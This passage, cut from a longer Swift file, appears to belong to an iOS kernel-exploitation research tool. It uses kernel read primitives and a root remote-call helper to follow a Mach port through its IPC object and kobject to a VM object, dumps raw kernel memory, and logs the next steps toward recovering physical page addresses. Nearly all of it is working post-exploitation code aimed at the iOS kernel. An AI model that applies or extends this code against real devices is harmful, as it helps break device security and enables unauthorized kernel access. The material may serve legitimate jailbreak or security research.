            // vm_object has vo_un1.vou_size at offset, and page list
            let objSize = ds_kread64(backingCopy + UInt64(off_vm_object_vo_un1_vou_size))
            let refCount = ds_kread32(backingCopy + UInt64(off_vm_object_ref_count))
            detail += "VM object size: 0x\(String(format: "%llx", objSize))\n"
            detail += "VM object refcount: \(refCount)\n"
            
            // The physical address might be stored in the vm_object's
            // resident page list or in a pager structure
            // Read first few fields to understand layout
            detail += "\nVM object raw dump (first 64 bytes):\n"
            for i in stride(from: 0, to: 64, by: 8) {
                let val = ds_kread64(backingCopy + UInt64(i))
                if val != 0 {
                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
                }
            }
            
            detail += "\nVM object found! Physical pages are tracked here.\n"
            detail += "The vm_page structures contain phys_page field.\n"
            detail += "Next: traverse vm_object's memq to find physical page numbers.\n"
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Summary
        detail += "\n=== SUMMARY ===\n"
        let gotKobject = kobject != 0 && backingCopy != 0
        if gotKobject {
            detail += "Successfully traversed: port → IPC → kobject → VM object!\n"
            detail += "Physical page info is in the VM object's page list.\n"
            detail += "Next experiment: read vm_page structs to get physical addresses.\n"
        } else {
            detail += "Could not fully traverse port kobject chain.\n"
        }
        
        let success = gotKobject
        return ExperimentResult(name: "Extract Phys Addr", success: success, detail: detail, timestamp: Date())
    }
    
    #endif
}
